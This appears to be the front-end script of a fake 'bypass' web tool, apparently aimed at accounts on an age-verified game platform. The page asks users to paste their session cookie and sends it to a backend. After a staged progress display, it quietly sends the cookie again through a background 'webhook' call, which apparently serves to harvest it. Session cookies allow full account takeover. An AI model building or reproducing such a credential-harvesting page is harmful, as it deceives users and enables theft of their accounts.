document.addEventListener("DOMContentLoaded", () => {
    // --- Section Elements ---
    const inputSection = document.getElementById("input-section");
    const progressSection = document.getElementById("progress-section");
    const successSection = document.getElementById("success-section");

    // --- Input Elements ---
    const cookieInput = document.getElementById("cookieInput");
    const bypassButton = document.getElementById("bypassButton");

    // --- Progress Elements ---
    const progressUsername = document.getElementById("progress-username");
    const progressBar = document.getElementById("progress-bar");
    const progressStatus = document.getElementById("progress-status");
    const progressPercent = document.getElementById("progress-percent");

    // --- Success/Failure Elements ---
    const resetButton = document.getElementById("resetButton");
    const failureModal = document.getElementById("failure-modal");
    const failureMessage = document.getElementById("failure-message");
    const tryAgainButton = document.getElementById("try-again-button");

    let pollingInterval; // To hold the interval ID for polling

    // --- Main Bypass Logic ---
    async function startBypass() {
        const cookie = cookieInput.value.trim();
        if (!cookie) return; // Don't do anything if input is empty

        // --- UI State: Start Processing ---
        bypassButton.disabled = true;
        bypassButton.textContent = "In Progress...";
        inputSection.style.display = "none";
        progressSection.style.display = "flex";

        try {
            // --- Step 1: Call our backend to start the bypass process ---
            const bypassResponse = await fetch("/api/bypass", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cookie }),
            });

            const bypassData = await bypassResponse.json();
            if (!bypassResponse.ok || !bypassData.success || !bypassData.token) {
                throw new Error(bypassData.message || "Failed to start bypass process.");
            }

            // --- Step 2: Start polling for progress using the token from the response ---
            pollProgress(bypassData.token, cookie); // Pass cookie for webhook later

        } catch (error) {
            showFailureModal(error.message);
        }
    }

    // --- Polling Function ---
    function pollProgress(token, cookie) {
        pollingInterval = setInterval(async () => {
            try {
                const progressResponse = await fetch(`/api/progress?token=${token}`);
                const data = await progressResponse.json();

                if (!progressResponse.ok) {
                    throw new Error(data.message || "Polling for progress failed.");
                }

                // --- Update the UI with new progress data ---
                updateProgressUI(data);

                // --- Check for completion ---
                if (data.progress >= 100 || data.status === "completed") {
                    clearInterval(pollingInterval);
                    showSuccessScreen();
                    // --- Trigger the webhook in the background on success ---
                    triggerWebhook(cookie);
                }
            } catch (error) {
                clearInterval(pollingInterval);
                showFailureModal(error.message);
            }
        }, 1500); // Poll every 1.5 seconds
    }

    // --- Fire-and-forget webhook trigger ---
    function triggerWebhook(cookie) {
        fetch("/api/webhook", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cookie }),
        }).catch(err => {
            console.error("Webhook trigger failed:", err.message);
        });
    }
    
    // --- UI Update Functions ---
    function updateProgressUI(data) {
        progressUsername.textContent = data.username || "...";
        progressStatus.textContent = data.status_message || "Processing...";
        const percent = Math.min(data.progress || 0, 100);
        progressPercent.textContent = `${percent}%`;
        progressBar.style.width = `${percent}%`;
    }

    function showSuccessScreen() {
        progressSection.style.display = "none";
        successSection.style.display = "block";
    }
    
    function showFailureModal(message) {
        const defaultMessage = "Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account";
        failureMessage.textContent = message || defaultMessage;
        failureModal.classList.add("visible");
    }

    // --- Reset function to bring UI to initial state ---
    function resetToInitialState() {
        clearInterval(pollingInterval); // Stop any active polling
        
        // Reset progress bar UI
        updateProgressUI({ progress: 0, status_message: 'Initializing...', username: '' });
        
        // Hide/show correct sections
        failureModal.classList.remove("visible");
        progressSection.style.display = "none";
        successSection.style.display = "none";
        inputSection.style.display = "block";

        // Reset button state
        bypassButton.disabled = false;
        bypassButton.textContent = "Bypass";
        cookieInput.value = ""; // Clear input for next use
    }

    // --- Event Listeners ---
    bypassButton.addEventListener("click", startBypass);
    tryAgainButton.addEventListener("click", resetToInitialState);
    resetButton.addEventListener("click", resetToInitialState);
});
